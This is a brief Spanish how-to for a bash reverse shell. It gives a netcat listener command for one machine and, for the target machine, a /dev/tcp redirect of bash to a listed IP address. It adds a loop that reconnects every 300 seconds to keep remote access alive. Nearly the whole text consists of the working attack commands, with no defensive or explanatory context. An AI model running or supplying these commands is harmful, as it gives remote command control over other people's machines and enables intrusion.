En una máquina (cliente) abrimos un puerto con netcat:
nc -kl 3000


En la máquina (servidor) donde van a ser ejecutados los comandos
exec bash >& /dev/tcp/10.26.236.136/7337 0>&1
while sleep 300; do exec bash >& /dev/tcp/ip.address/port.number 0>&1; done


Cuando el cliente escriba comandos en su netcat, le contestará el bash del servidor
